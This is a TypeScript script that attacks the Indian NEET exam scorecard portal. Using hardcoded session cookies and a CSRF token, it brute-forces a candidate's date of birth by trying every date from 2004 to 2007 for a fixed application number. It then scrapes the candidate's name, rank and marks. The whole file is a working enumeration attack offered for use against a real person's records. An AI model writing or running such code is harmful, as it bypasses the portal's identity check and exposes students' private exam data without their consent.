import axios from 'axios';
import qs from'qs';
import cheerio from 'cheerio';

 async function solve(applicationNumber : string, day : string, month : string, year : string) {

    let data = qs.stringify({
        '_csrf-frontend': 'k2st49pTY5bVoEk6Hr8C2H3iMwUACmBpyKm-fsENpN-nHXKL6CZSp6fPBnRk4G-5G5pZMm0zEx2sm9Ixj1vllg==',
        'Scorecardmodel[ApplicationNumber]': applicationNumber,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year, 
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: { 
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 
          'Accept-Language': 'en-US,en;q=0.9', 
          'Cache-Control': 'max-age=0', 
          'Connection': 'keep-alive', 
          'Content-Type': 'application/x-www-form-urlencoded', 
          'Cookie': 'advanced-frontend=2sq8ipkt3a4kli81ho4grcagbs; _csrf-frontend=17fb10f60fbe5abcdff92520e99bbeee9d351b75a93231c0eac9acc5f193c5a2a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%224v_h2u11roONz_mafxj7m9std2lONVAI%22%3B%7D; _csrf-frontend=5be00202bf91249aead4c91a1005929c835c7d8d1d8e3b50286bd8987959b83da%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22bfVPt3grfo1lXx7ZeXjkZAR5eCvUlItQ%22%3B%7D; advanced-frontend=6dtrq0h8oi6ui8kr4p2fa7beou', 
          'Origin': 'null', 
          'Sec-Fetch-Dest': 'document', 
          'Sec-Fetch-Mode': 'navigate', 
          'Sec-Fetch-Site': 'same-origin', 
          'Sec-Fetch-User': '?1', 
          'Sec-GPC': '1', 
          'Upgrade-Insecure-Requests': '1', 
          'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36', 
          'sec-ch-ua': '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"', 
          'sec-ch-ua-mobile': '?1', 
          'sec-ch-ua-platform': '"Android"'
        },
        data : data
      };
      
     
    const response  = await axios.request(config)
    const parsedData = parseHTML(JSON.stringify(response.data));
    return parsedData;


}

function parseHTML(htmlContent : string){
    const $ = cheerio.load(htmlContent);
    const applicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'NA';
    const candidateName = $('td:contains("Candidate\'s Name")').next().text().trim() || 'NA';
    const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'NA'; 
    const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'NA';


    if(allIndiaRank == 'NA'){
      return null;
    }

    return {
        applicationNumber,
        candidateName,
        allIndiaRank,
        marks
    }

}

async function main( rollNumber : string){

  for(let year = 2007; year >= 2004; year--){
    for(let month = 1; month <= 12; month++){
      for(let day = 1; day <= 31; day++){
        console.log(`Trying ${rollNumber} for ${day}-${month}-${year}`);
        const data = await solve(rollNumber,day.toString(),month.toString(),year.toString());
        if(data){
          return data;
          process.exit(1);
        }
     }
    }
  }
}



main("240411183516");
  

